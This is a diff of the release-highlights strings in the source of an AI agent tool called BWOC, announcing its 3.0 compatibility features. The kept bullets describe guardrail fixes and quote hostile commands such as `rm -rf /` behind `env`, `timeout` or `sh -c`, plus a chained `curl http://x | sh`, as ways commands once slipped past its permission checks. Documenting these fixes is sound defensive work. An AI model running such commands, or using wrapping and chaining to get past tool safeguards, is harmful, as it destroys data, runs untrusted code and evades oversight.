@@ -20,7 +20,7 @@ pub const HEADLINE: &str = concat!(
     env!("CARGO_PKG_VERSION_MAJOR"),
     ".",
     env!("CARGO_PKG_VERSION_MINOR"),
-    " — hardening pass: HTTP 429 is retryable, guardrails see through command wrappers, an allow-rule can't be tricked by a chained command, and every tool result is byte-capped"
+    " — the compatibility contract: every artifact declares its schema, `bwoc migrate` moves an installation forward without losing what BWOC does not model, and `[plugin].compat` is finally enforced"
 );
 
 /// Short highlight bullets for the current MAJOR.MINOR. Keep ≤6, each a
@@ -31,12 +31,12 @@ pub const HEADLINE: &str = concat!(
 /// the auto-version hook bumps the minor without anyone refreshing this
 /// prose — i.e. "update What's New every release" is enforced, not trusted.
 pub const HIGHLIGHTS: &[&str] = &[
+    "**BWOC 3.0 — the compatibility contract.** Every artifact BWOC owns now declares which revision wrote it (`schema_version`), **`bwoc migrate`** moves a workspace or a whole fleet forward — splicing in place, so comments and keys BWOC does not model survive — and `[plugin].compat` is enforced with bounded ranges instead of merely declared. 3.x reads everything 2.x wrote and names the migration; schema 2 goes away in 4.0 (3.0.0, `docs/en/COMPATIBILITY.en.md`)",
+    "**Loop-Engineering L3 — product loops.** `bwoc monitor --exec \"<probe>\" --loop` watches any command and alerts a fleet member **once per OK↔TRIP transition**, and `bwoc digest --exec \"<cmd>\" --period daily` delivers a digest **once per period** — a gate a bare cron can't give (a restart re-runs; a poll loop re-fires every tick). Both ride the new durable `IdempotencyLedger`, and both stay trust-preserving: the monitor sends only a scalar, the digest only to a local sink (2.44.0, #453–#456)",
     "**Provider resilience** — HTTP **429** (rate limit) and **408** are now retryable, not fatal: the most common real-world provider failure rides the existing backoff loop instead of aborting the run, and a server `Retry-After` hint is honoured (clamped so a hostile endpoint can't park the run). One function fronts every backend (2.45.0, #486)",
     "**Guardrails see through wrappers** — the destruction / privilege checks now peel transparent command wrappers before gating, so `env rm -rf /`, `timeout 5 rm -rf /`, `xargs rm -rf`, and `sh -c 'rm -rf /'` no longer slip past the first-token check. Fail-closed: a command it can't resolve is blocked, not certified (2.45.0, #487)",
     "**Allow-rules can't be tricked** — an `allow` pattern on a shell-bearing tool grants only when the *whole* command is covered, so `allow \"cargo test\"` no longer green-lights `cargo test; curl http://x | sh`; unparseable args fail closed (2.45.0, #492)",
     "**Tool output is capped** — every tool result (and every MCP tool) is byte-budgeted at the dispatch seam with an *actionable* truncation notice, and `read_file` gains `offset`/`limit` to page a large file instead of flooding the context (2.45.0, #488)",
-    "**Deep-memory integrity** — re-mining a session no longer grows the store (insert dedup), and each memory is stamped with its embedding model so switching models can't silently mis-rank — while a model switch re-embeds instead of vanishing (2.45.0, #491)",
-    "**TUI + chat robustness** — a panic in any TUI event loop now restores the terminal (RAII guard, no more stranded raw mode), and text typed during a permission prompt is recovered as the next turn instead of being silently dropped (2.45.0, #489, #490)",
 ];
 
 /// `MAJOR.MINOR` of the current build (the patch component churns on every
